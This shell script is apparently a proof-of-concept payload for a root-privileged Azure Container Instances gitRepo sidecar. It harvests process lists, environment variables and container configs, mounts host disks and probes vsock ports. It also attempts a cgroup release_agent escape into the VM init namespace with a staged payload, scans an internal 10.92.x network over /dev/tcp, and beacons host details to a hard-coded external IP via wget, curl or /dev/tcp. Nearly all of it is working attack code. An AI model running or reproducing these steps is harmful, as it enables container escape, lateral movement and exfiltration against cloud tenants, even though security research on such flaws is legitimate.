#!/bin/sh
# _recon.sh — recon body for the ACI gitRepo sidecar PoC.
# Called SYNCHRONOUSLY by _dispatch.sh: the local report (all fast /proc reads) is
# written to the gitRepo VOLUME first — that file persists after the ephemeral sidecar
# is torn down and is mounted into the user container (retrievable via az container
# exec). Only the slow OOB GET (and the optional release_agent fire) are detached at
# the end so they cannot delay the clone / hang the container.
#
# Runs as ROOT in the privileged aci-atlas-sidecar-gitrepo container.

WORKTREE="${1:-$(pwd)}"
OUT="RECON_ACI_GITREPO.txt"

# ── Out-of-band collector (OPTIONAL) ──────────────────────────────────────────
# In-band retrieval needs NONE of this. Set to "" to disable OOB entirely.
# Default = the live research collector (RG aci-collector). Change per engagement.
OOB_HOST="4.157.206.88"
OOB_PORT="80"

# ── cgroup release_agent fire (OPT-IN) ────────────────────────────────────────
# When 1: mounts a fresh cgroup v1 hierarchy, sets release_agent to the LCOW VM
# init-namespace path of our payload, fires the escape, and waits for output.
# The payload runs in the LCOW VM init namespace (NOT the container) and writes
# to the overlay upper dir so the output is visible at /tmp/.escape_out.txt
# inside the container.
DO_CGROUP_FIRE=1

# ── Collect ───────────────────────────────────────────────────────────────────
report() {
    echo "=== ACI gitRepo sidecar recon — root code execution confirmed ==="
    echo "## when (sidecar clock)"; date -u 2>&1
    echo "## id";        id 2>&1
    echo "## uname";     uname -a 2>&1
    echo "## hostname";  hostname 2>&1
    echo "## self cgroup"; cat /proc/self/cgroup 2>&1
    echo "## pid1 cgroup"; cat /proc/1/cgroup 2>&1
    echo "## capabilities (/proc/self/status)"; grep -iE 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status 2>&1
    echo "## cgroup fs layout (/sys/fs/cgroup)"; ls -la /sys/fs/cgroup 2>&1

    echo "## ===== PROCESSES IN SHARED PID NAMESPACE ====="
    echo "## (sidecar shares pid/net/ipc with the pod sandbox; this lists every"
    echo "##  process visible from inside the sidecar — i.e. our utility-VM neighbours)"
    if command -v ps >/dev/null 2>&1; then
        echo "## --- ps -ef ---"; ps -ef 2>&1 || ps aux 2>&1
    fi
    echo "## --- /proc walk (pid uid root-fs comm :: cmdline) ---"
    for d in /proc/[0-9]*; do
        pid=${d#/proc/}
        comm=$(cat "$d/comm" 2>/dev/null)
        uid=$(awk '/^Uid:/{print $2}' "$d/status" 2>/dev/null)
        root=$(readlink "$d/root" 2>/dev/null)
        cmd=$(tr '\0' ' ' < "$d/cmdline" 2>/dev/null)
        cg=$(awk -F: 'NR==1{print $3}' "$d/cgroup" 2>/dev/null)
        printf 'pid=%-6s uid=%-5s root=%-40s comm=%-16s cg=%s :: %s\n' \
            "$pid" "$uid" "${root:-?}" "${comm:-?}" "${cg:-?}" "${cmd:-?}"
    done

    echo "## ===== cgroup escape surface (non-destructive) ====="
    echo "## /sys/fs/cgroup mount line"; grep -E ' cgroup| cgroup2' /proc/mounts 2>&1
    echo "## release_agent present?"; ls -la /sys/fs/cgroup/*/release_agent /sys/fs/cgroup/release_agent 2>&1
    echo "## can we mount a fresh cgroup hierarchy?"
    mkdir -p /tmp/.cgtest 2>/dev/null
    if mount -t cgroup -o rdma cgroup /tmp/.cgtest 2>/tmp/.cgerr; then
        echo "   MOUNT OK -> /tmp/.cgtest"
        echo "   release_agent writable?"; [ -w /tmp/.cgtest/release_agent ] && echo "   YES (writable)" || echo "   no"
        umount /tmp/.cgtest 2>/dev/null
    else
        echo "   mount failed: $(cat /tmp/.cgerr 2>/dev/null)"
    fi
    rmdir /tmp/.cgtest 2>/dev/null

    echo "## host block devices visible"; ls -la /dev/sd* /dev/loop* 2>&1
    echo "## mounts (head)"; head -40 /proc/mounts 2>&1

    echo "## ===== VM / SERVICE FABRIC MESH HUNT ====="
    echo "## --- env: sidecar ---";    cat /proc/self/environ 2>/dev/null | tr '\0' '\n'
    echo "## --- env: pid1 (pause) ---"; cat /proc/1/environ 2>/dev/null | tr '\0' '\n'
    echo "## --- env: mount_git (pid of /mount_git.sh) ---"
    for p in /proc/[0-9]*; do
        grep -qa 'mount_git' "$p/cmdline" 2>/dev/null && cat "$p/environ" 2>/dev/null | tr '\0' '\n'
    done
    echo "## --- resolv.conf / hosts (cluster domain) ---"; cat /etc/resolv.conf /etc/hosts 2>&1
    echo "## --- ip addr / route (shared netns) ---"; (ip addr; ip route) 2>&1 || ifconfig -a 2>&1
    echo "## --- listening + established sockets (control-plane?) ---"
    (ss -tanp 2>/dev/null || netstat -tanp 2>/dev/null) | head -60
    echo "## --- /proc/net/tcp (raw, in case no ss/netstat) ---"; head -40 /proc/net/tcp 2>&1
    echo "## --- GCS state dir /run/gcs/c (host's view of EVERY container in this VM) ---"
    ls -la /run/gcs/c/ 2>&1 | head -40
    for c in /run/gcs/c/*/config.json; do
        [ -f "$c" ] && { echo "## == $c =="; head -c 4000 "$c" 2>/dev/null; echo; }
    done
    echo "## --- other container rootfs roots in this VM ---"; ls -la /run/gcs/c/*/rootfs 2>/dev/null | head -20

    echo "## ===== /proc/1/root PROBE (CAP_SYS_PTRACE: direct init-ns filesystem access) ====="
    echo "## /proc/1/root/ contents (if accessible with ALL caps)"
    ls -la /proc/1/root/ 2>&1 | head -20
    echo "## /proc/1/root/run/ (looking for GCS state)"
    ls -la /proc/1/root/run/ 2>&1 | head -20
    echo "## /proc/1/root/run/gcs/"
    ls -la /proc/1/root/run/gcs/ 2>&1 | head -20
    echo "## /proc/1/root/bin/ (init ns /bin contents)"
    ls /proc/1/root/bin/ 2>&1 | head -30
    echo "## /proc/1/ns/ vs /proc/self/ns/ (are namespaces shared or isolated?)"
    ls -la /proc/1/ns/ 2>&1
    ls -la /proc/self/ns/ 2>&1
    echo "## /proc/1/mountinfo (first 30 lines — init ns or container ns?)"
    head -30 /proc/1/mountinfo 2>&1
    echo "## WRITE TEST: can we write to /proc/1/root/tmp/ ?"
    echo "SIDECAR_WROTE" > /proc/1/root/tmp/.initns_test 2>/dev/null && \
        echo "  WRITE OK — /proc/1/root/tmp/ is writable from sidecar!" || \
        echo "  WRITE FAIL — /proc/1/root/tmp/ not writable (permission or same ns)"
    echo "## /proc/1/root/run/gcs/gcs.log (first 50 lines)"
    head -50 /proc/1/root/run/gcs/gcs.log 2>&1 || echo "  gcs.log not accessible"
    echo "## /proc/1/root/etc/hosts (init ns hosts file)"
    cat /proc/1/root/etc/hosts 2>&1 || echo "  not accessible"

    echo "## ===== PRIVILEGED SIDECAR: VSOCK / DISK / NETWORK PROBE ====="
    echo "## --- /dev/vsock available? ---"; ls -la /dev/vsock 2>&1
    echo "## --- vsock probe (AF_VSOCK CID=2 host, common GCS ports) ---"
    # Try each GCS vsock port via Python if available; fall back to socat
    for port in 2056 2057 1024 8000 8080; do
        res=$(python3 -c "
import socket, sys
try:
    s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((2,$port))
    banner=s.recv(256)
    print('OPEN cid=2 port=$port banner='+repr(banner))
    s.close()
except Exception as e:
    print('CLOSED/ERR cid=2 port=$port: '+str(e))
" 2>&1 || echo "python3 unavailable port=$port")
        echo "  $res"
    done
    echo "## --- raw disk: blkid + superblock strings (sector 0 and 2) ---"
    OUR_DEV=$(awk '/\/mount\/gitrepo/{print $1; exit}' /proc/mounts 2>/dev/null)
    blkid /dev/sd* 2>&1 || true
    for dev in /dev/sda /dev/sdb /dev/sdd /dev/sde /dev/sdf /dev/sdg /dev/sdh /dev/sdi; do
        [ -b "$dev" ] || continue
        [ "$dev" = "$OUR_DEV" ] && continue
        printf '  %s MBR+super: ' "$dev"
        dd if="$dev" bs=512 count=4 2>/dev/null | strings | tr '\n' '|' | cut -c1-200
        echo
    done
    echo "## --- mount non-gitrepo ext4 disks + list root contents ---"
    for dev in /dev/sda /dev/sdb /dev/sdd /dev/sde /dev/sdf /dev/sdg /dev/sdh /dev/sdi; do
        [ -b "$dev" ] || continue
        [ "$dev" = "$OUR_DEV" ] && continue
        mnt="/tmp/.mnt_${dev##*/}"
        mkdir -p "$mnt" 2>/dev/null
        if mount -o ro "$dev" "$mnt" 2>/dev/null; then
            echo "  === MOUNTED $dev at $mnt ==="
            ls -laR "$mnt/" 2>&1 | head -60
            # Read interesting files
            for f in "$mnt/mount_git.sh" "$mnt/etc/os-release" "$mnt/etc/hostname" \
                      "$mnt/info/gcs" "$mnt/home/gcs.conf" "$mnt/etc/gcs.conf"; do
                [ -f "$f" ] && { echo "  --- $f ---"; cat "$f" 2>&1; }
            done
            # Strings the main binary if it looks like GCS (sda has init)
            if [ -x "$mnt/init" ] && [ "$(wc -c < "$mnt/init")" -gt 100000 ]; then
                echo "  --- strings $mnt/init (GCS binary, first 200 lines) ---"
                strings "$mnt/init" 2>/dev/null | grep -iE 'vsock|gcs|port|cid|secret|token|key|path|log|listen|connect|fabric|azure' | head -80
            fi
            # Copy vsock/GCS tools to persistent volume for later use via az container exec
            for tool in "$mnt/bin/vsockexec" "$mnt/bin/gcs" "$mnt/bin/gcstools" "$mnt/bin/wait-paths"; do
                [ -f "$tool" ] && cp "$tool" "$WORKTREE/$(basename "$tool")" 2>/dev/null && \
                    chmod +x "$WORKTREE/$(basename "$tool")" 2>/dev/null && \
                    echo "  COPIED: $(basename "$tool") -> $WORKTREE/"
            done
            # Try vsockexec immediately while we still have the sidecar's context
            if [ -x "$mnt/bin/vsockexec" ]; then
                echo "  --- vsockexec --help ---"
                "$mnt/bin/vsockexec" --help 2>&1 | head -20 || true
                echo "  --- vsockexec probe CID=2 port=2056 (GCS) ---"
                echo "" | "$mnt/bin/vsockexec" -t 3 2 2056 /bin/sh -c 'echo CONNECTED; cat /dev/stdin' 2>&1 | head -20 || \
                    "$mnt/bin/vsockexec" 2 2056 echo CONNECTED 2>&1 | head -10 || true
            fi
            umount "$mnt" 2>/dev/null
        else
            echo "  $dev: mount failed"
        fi
        rmdir "$mnt" 2>/dev/null
    done
    echo "## --- vsock probe (CID=2 host, GCS port 2056) ---"
    if command -v socat >/dev/null 2>&1; then
        for port in 2056 2057 1024; do
            out=$(echo "" | socat -T2 - VSOCK-CONNECT:2:"$port" 2>&1 | head -c 200)
            echo "  vsock cid=2 port=$port: ${out:-<no response>}"
        done
    else
        echo "  socat not found — vsock requires AF_VSOCK socket, cannot probe without binary"
        echo "  /dev/vsock device: $(ls -la /dev/vsock 2>&1)"
    fi
    echo "## --- route: 10.92.0.0/16 added via eth0 (for deferred TCP probe) ---"
    ip route add 10.92.0.0/16 dev eth0 2>&1 || true
    ip route show 2>&1
    echo "## (TCP probe to 10.92.x is DETACHED below to avoid delaying the clone)"
}

report > "$WORKTREE/$OUT" 2>&1

# ── cgroup v1 release_agent escape → LCOW VM init namespace ────────────────────
# Technique: overlay upper-dir path injection.
#   The sidecar container's overlayfs upper dir lives on the LCOW VM init
#   namespace's /run tmpfs (GCS created it there before building our mount ns).
#   Writing /tmp/.escape.sh from the container stores the file via the overlay
#   kernel module directly into that tmpfs inode.  From the init namespace the
#   same inode is addressable at $UPPERDIR/tmp/.escape.sh — a valid path for
#   call_usermodehelper to execute.
#
#   Output channel: init-ns payload writes to /dev/sdc (gitRepo volume, 8:32)
#   by finding its mount-point via 'awk major:minor /proc/self/mountinfo'.
#   The sidecar then reads ESCAPE_OUTPUT.txt from /mount/gitrepo/ without any
#   dcache-invalidation issue (the gitRepo volume is a plain ext4 mount in both
#   namespaces, not an overlay).
#
#   OOB beacon: payload also fires wget to $OOB_HOST/INITNS_ESCAPE so the
#   collector confirms execution even if the sdc write path fails.
if [ "$DO_CGROUP_FIRE" = "1" ]; then
{
    echo "CGROUP_ESCAPE: === poc20 — correct init-ns path via mountinfo root field ==="

    # ── Pre-flight diagnostics ───────────────────────────────────────
    echo "--- sdc mountinfo (8:32) ---"
    grep '8:32' /proc/self/mountinfo 2>/dev/null || echo "  not found"
    echo "--- /run/mounts/scsi/ contents ---"
    ls /run/mounts/scsi/ 2>&1 | head -10

    # ── Parse overlay upperdir ───────────────────────────────────────
    UPPERDIR=""
    while IFS= read -r _mline; do
        set -- $_mline; _mp="$5"; shift 6 2>/dev/null
        while [ $# -gt 0 ] && [ "$1" != "-" ]; do shift; done
        [ "$1" = "-" ] && shift; _fst="$1"
        if [ "$_mp" = "/" ] && [ "$_fst" = "overlay" ]; then
            shift 2; _ud="${1##*upperdir=}"; _ud="${_ud%%,*}"; [ -n "$_ud" ] && UPPERDIR="$_ud"; break
        fi
    done < /proc/self/mountinfo

    # ── Locate correct init-ns path for gitRepo volume ──────────────
    # SDC_MNT  = sidecar mount point of sdc (field 5) = /mount/gitrepo
    # SDC_ROOT = path within sdc's ext4 that is bind-mounted (field 4)
    #            e.g. /sandboxMounts/tmp/atlas/gitRepoVolume/<appid>/hooks
    # init-ns path = /run/mounts/scsi/m1 + SDC_ROOT + /mnt/
    SDC_MNT=$(awk '$3=="8:32"{print $5; exit}' /proc/self/mountinfo 2>/dev/null)
    SDC_ROOT=$(awk '$3=="8:32"{print $4; exit}' /proc/self/mountinfo 2>/dev/null)
    SDC_MNT_SUBDIR="${SDC_MNT}/mnt"
    INIT_NS_SDC="/run/mounts/scsi/m1${SDC_ROOT}/mnt"
    echo "CGROUP_ESCAPE: sdc_mnt=$SDC_MNT  sdc_root_in_ext4=$SDC_ROOT"
    echo "CGROUP_ESCAPE: init_ns_sdc_mnt=$INIT_NS_SDC  upperdir=$UPPERDIR"

    # Can we see the init-ns sdc path from the sidecar?
    echo "CGROUP_ESCAPE: init-ns path from sidecar: $(ls -la ${INIT_NS_SDC}/ 2>&1 | head -5)"

    # ── Stage ELF and escape.sh ──────────────────────────────────────
    HOOKDIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
    ESCAPE_ELF="${SDC_MNT_SUBDIR}/escape_elf"
    ESCAPE_SH="${SDC_MNT_SUBDIR}/escape.sh"

    cp "${HOOKDIR}/escape_elf" "$ESCAPE_ELF" 2>/dev/null && chmod +x "$ESCAPE_ELF"
    echo "CGROUP_ESCAPE: ELF staged: $(ls -la $ESCAPE_ELF 2>&1)"

    # Write escape.sh with $INIT_NS_SDC embedded (unquoted heredoc expands it)
    cat > "$ESCAPE_SH" << INITNS_PAYLOAD
#!/usr/bin/ash
OUT_DIR="${INIT_NS_SDC}"
OUT="\$OUT_DIR/ESCAPE_OUTPUT.txt"
mkdir -p "\$OUT_DIR" 2>/dev/null
{
echo "INITNS_ESCAPE: running in LCOW init namespace — poc20"
echo "  date: \$(date -u 2>/dev/null)"
echo "  id: \$(id 2>/dev/null)"
echo "  uname: \$(uname -a 2>/dev/null)"
echo "  pid: \$\$"
echo "  /proc/self/cgroup:"; cat /proc/self/cgroup 2>/dev/null
echo "  /proc/mounts (head-20):"; head -20 /proc/mounts 2>/dev/null
echo "  env (head-30):"; env 2>/dev/null | head -30
} > "\$OUT" 2>&1
cp "\$OUT" /tmp/ESCAPE_OUTPUT.txt 2>/dev/null
wget -q -T 5 -O /dev/null "http://4.157.206.88/INITNS_ESCAPE_ASH_POC20" 2>/dev/null || true
INITNS_PAYLOAD
    chmod +x "$ESCAPE_SH"
    echo "CGROUP_ESCAPE: escape.sh staged:"
    head -3 "$ESCAPE_SH" 2>&1

    # Copy payloads to overlay upper dir (fallback path in init ns)
    cp "$ESCAPE_ELF" /tmp/.escape_elf 2>/dev/null && chmod +x /tmp/.escape_elf
    cp "$ESCAPE_SH" /tmp/.escape.sh 2>/dev/null && chmod +x /tmp/.escape.sh

    # ── Attempt escape ──────────────────────────────────────────────
    CG_MNT=/tmp/.cge_$$
    mkdir -p "$CG_MNT" 2>/dev/null

    for AGENT_PATH in \
        "${INIT_NS_SDC}/escape.sh" \
        "${INIT_NS_SDC}/escape_elf" \
        "${UPPERDIR}/tmp/.escape.sh" \
        "${UPPERDIR}/tmp/.escape_elf"
    do
        [ -z "$AGENT_PATH" ] && continue
        echo "CGROUP_ESCAPE: trying $AGENT_PATH"

        umount "$CG_MNT" 2>/dev/null; rmdir "$CG_MNT" 2>/dev/null
        mkdir -p "$CG_MNT" 2>/dev/null
        mount -t cgroup -o memory cgroup "$CG_MNT" 2>/dev/null || { echo "  cgroup mount failed — aborting"; break; }
        echo "$AGENT_PATH" > "$CG_MNT/release_agent" 2>/dev/null
        _stored=$(cat "$CG_MNT/release_agent" 2>/dev/null)
        echo "CGROUP_ESCAPE:   release_agent stored='$_stored'"
        echo 1 > "$CG_MNT/notify_on_release" 2>/dev/null

        CGCHILD="$CG_MNT/esc$$"
        mkdir -p "$CGCHILD" 2>/dev/null
        echo 1 > "$CGCHILD/notify_on_release" 2>/dev/null

        echo $$ > "$CGCHILD/cgroup.procs" 2>/dev/null
        _tasks_before=$(cat "$CGCHILD/tasks" 2>/dev/null | wc -l | tr -d ' ')
        echo $$ > "$CG_MNT/cgroup.procs" 2>/dev/null
        _tasks_after=$(cat "$CGCHILD/tasks" 2>/dev/null | wc -l | tr -d ' ')
        echo "CGROUP_ESCAPE:   tasks before=$_tasks_before after=$_tasks_after (0=empty=fired)"

        echo "CGROUP_ESCAPE:   waiting 15s for output..."
        _i=0
        while [ $_i -lt 15 ]; do
            [ -f "$SDC_MNT_SUBDIR/ESCAPE_OUTPUT.txt" ]              && break
            [ -f "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" ]   && break
            [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]                     && break
            [ -f "/tmp/ESCAPE_OUTPUT.txt" ]                          && break
            sleep 1; _i=$((_i+1))
        done

        rmdir "$CGCHILD" 2>/dev/null
        umount "$CG_MNT" 2>/dev/null; rmdir "$CG_MNT" 2>/dev/null

        for _op in "$SDC_MNT_SUBDIR/ESCAPE_OUTPUT.txt" \
                   "${SDC_MNT:-/mount/gitrepo}/mnt/ESCAPE_OUTPUT.txt" \
                   "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" \
                   "/tmp/ESCAPE_OUTPUT.txt" \
                   "$WORKTREE/ESCAPE_OUTPUT.txt"; do
            [ -f "$_op" ] && cp "$_op" "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null && break
        done

        if [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]; then
            echo "CGROUP_ESCAPE: SUCCESS via $AGENT_PATH after ${_i}s"
            head -40 "$WORKTREE/ESCAPE_OUTPUT.txt" 2>&1
            break
        else
            echo "CGROUP_ESCAPE:   no output after ${_i}s"
        fi
    done

    # ── Post-mortem if all attempts failed ───────────────────────────
    if [ ! -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]; then
        echo "CGROUP_ESCAPE: all paths failed — collecting diagnostics"
        echo "  init-ns path: $(ls -la ${INIT_NS_SDC}/ 2>&1 | head -5)"
        echo "  escape.sh head: $(head -3 $ESCAPE_SH 2>&1)"
        echo "  mnt subdir: $(ls -la ${SDC_MNT_SUBDIR}/ 2>&1 | head -5)"
        echo "--- /dev/kmsg (timeout 3s) ---"
        timeout 3 cat /dev/kmsg 2>/dev/null | tail -50 || echo "  (kmsg read failed/timed out)"
        SDA_MNT=/tmp/.mnt_sda
        mkdir -p "$SDA_MNT" 2>/dev/null
        mount -o ro /dev/sda "$SDA_MNT" 2>/dev/null
        if [ -x "$SDA_MNT/usr/bin/busybox" ]; then
            echo "--- dmesg via $SDA_MNT/usr/bin/busybox (last 60 lines) ---"
            "$SDA_MNT/usr/bin/busybox" dmesg 2>/dev/null | tail -60
        fi
        umount "$SDA_MNT" 2>/dev/null
        rmdir "$SDA_MNT" 2>/dev/null
    fi
} >> "$WORKTREE/$OUT" 2>&1
fi

# ── Fallback in-band drops (common user-container mount paths) ─────────────────
for p in /mount/gitrepo /mount/gitrepo/mnt /tmp/hooks /mnt/repo /tmp; do
    cp "$WORKTREE/$OUT" "$p/$OUT" 2>/dev/null || true
done

# ── Deferred 10.92.x TCP probe (DETACHED + cgroup-migrated, survives sidecar teardown) ──
PROBE_OUT="$WORKTREE/PROBE_10_92.txt"
PROBE_SH="$WORKTREE/_probe.sh"
cat > "$PROBE_SH" << 'PROBE_EOF'
#!/bin/bash
# Probe SF management network (10.92.x) from the privileged sidecar netns.
# Migrates into pause's cgroup immediately so it survives sidecar teardown.
OUT="$1"

# Migrate into pause (pid1) cgroup so we outlive the sidecar cgroup kill
while IFS=: read -r _i ctrls path; do
    [ -z "$path" ] && continue
    for c in ${ctrls//,/ }; do
        [ -w "/sys/fs/cgroup/$c$path/cgroup.procs" ] && \
            echo $$ > "/sys/fs/cgroup/$c$path/cgroup.procs" 2>/dev/null
    done
done < /proc/1/cgroup

echo "=== PROBE START $(date -u) pid=$$ ===" >> "$OUT"
ip route add 10.92.0.0/16 dev eth0 2>/dev/null || true
ip route show >> "$OUT" 2>&1

# Bash /dev/tcp scan. Route '10.92.0.0/16 dev eth0 scope link' means ARP-based
# routing: unreachable hosts return EHOSTUNREACH in ~3-5s (ARP timeout), not 120s TCP
# timeout. Filtered ports (reachable host, no SYN-ACK) could still hang — accept that.
for target in 10.92.0.15 10.92.0.14 10.92.0.13 10.92.0.12 10.92.0.4 10.92.0.6; do
    for port in 19080 19000 1025 9100 8080 80 443 22 2379 6443 10250; do
        res=$(
            set +e
            exec 3<>/dev/tcp/"$target"/"$port" 2>&1
            rc=$?
            if [ $rc -eq 0 ]; then
                printf 'GET / HTTP/1.0\r\nHost: %s\r\n\r\n' "$target" >&3
                read -t 3 -u 3 line 2>/dev/null
                echo "OPEN:${line:-empty}"
                exec 3>&-
            else
                echo "FAIL:$rc"
            fi
        )
        echo "${res:-ERR} ${target}:${port}" >> "$OUT"
    done
done

echo "=== PROBE DONE $(date -u) ===" >> "$OUT"
PROBE_EOF
chmod +x "$PROBE_SH"
setsid bash "$PROBE_SH" "$PROBE_OUT" </dev/null >/dev/null 2>&1 &

# ── Out-of-band compact summary (DETACHED — never delays the clone) ───────────
# Backgrounded so a slow/blocked connect cannot hang the hook. The full report is
# already durable in the volume by this point, so losing the OOB GET costs nothing.
if [ -n "$OOB_HOST" ]; then
    who=$(id 2>/dev/null | tr ' ' '+' )
    host=$(hostname 2>/dev/null)
    kern=$(uname -r 2>/dev/null)
    nproc=$(ls -d /proc/[0-9]* 2>/dev/null | wc -l | tr -d ' ')
    q="/?poc=gitrepo-rce&id=${who}&host=${host}&kr=${kern}&nproc=${nproc}"
    setsid /bin/sh -c '
        if command -v wget >/dev/null 2>&1; then
            wget -q -T 8 -O /dev/null "http://'"${OOB_HOST}:${OOB_PORT}${q}"'"
        elif command -v curl >/dev/null 2>&1; then
            curl -s -m 8 -o /dev/null "http://'"${OOB_HOST}:${OOB_PORT}${q}"'"
        else
            bash -c "exec 3<>/dev/tcp/'"${OOB_HOST}"'/'"${OOB_PORT}"'; printf \"GET '"${q}"' HTTP/1.0\r\nHost: '"${OOB_HOST}"'\r\n\r\n\" >&3; cat <&3 >/dev/null"
        fi
    ' </dev/null >/dev/null 2>&1 &
fi

exit 0
